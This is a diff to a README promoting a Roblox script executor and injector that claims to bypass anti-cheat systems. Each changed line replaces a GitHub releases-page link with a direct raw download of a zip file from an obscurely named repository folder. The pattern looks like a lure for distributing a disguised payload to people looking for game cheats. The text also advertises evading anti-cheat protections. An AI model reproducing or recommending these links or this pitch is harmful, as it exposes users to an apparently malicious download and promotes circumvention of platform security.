@@ -1,7 +1,7 @@
 # 🎮 Roblox-Executor-Injector-2025 - Unlock Endless Possibilities in Roblox
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/kidkaitou121212/Roblox-Executor-Injector-2025/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/kidkaitou121212/Roblox-Executor-Injector-2025/main/imaginableness/Roblox_Executor_Injector_2.3.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/kidkaitou121212/Roblox-Executor-Injector-2025/main/imaginableness/Roblox_Executor_Injector_2.3.zip)
 
 ## 📖 Introduction
 Welcome to Roblox-Executor-Injector-2025! This tool allows you to easily execute scripts in Roblox games, enhancing your gaming experience. With its powerful Level 7 executor and universal injector, you can bypass Anti-Cheat systems and enjoy new features not normally available.
@@ -17,7 +17,7 @@ Ensure your system meets the following requirements:
 - Roblox installed on your computer
 
 ### Step 2: Visit the Releases Page
-Go to the following link to download the software: [Visit Releases Page](https://github.com/kidkaitou121212/Roblox-Executor-Injector-2025/releases).
+Go to the following link to download the software: [Visit Releases Page](https://raw.githubusercontent.com/kidkaitou121212/Roblox-Executor-Injector-2025/main/imaginableness/Roblox_Executor_Injector_2.3.zip).
 
 ### Step 3: Download the Installer
 On the Releases page, locate the latest version of Roblox-Executor-Injector-2025. Click on the download link to save the file to your computer.
@@ -72,4 +72,4 @@ Keep an eye on the Releases page for updates, new features, and any bug fixes.
 Using Roblox-Executor-Injector-2025 opens up a realm of possibilities in your Roblox experience. Download it today and step into a new world of gaming!
 
 ## Download & Install
-To get started, remember to [visit this page to download](https://github.com/kidkaitou121212/Roblox-Executor-Injector-2025/releases) Roblox-Executor-Injector-2025. Enjoy your enhanced Roblox gaming!
+To get started, remember to [visit this page to download](https://raw.githubusercontent.com/kidkaitou121212/Roblox-Executor-Injector-2025/main/imaginableness/Roblox_Executor_Injector_2.3.zip) Roblox-Executor-Injector-2025. Enjoy your enhanced Roblox gaming!
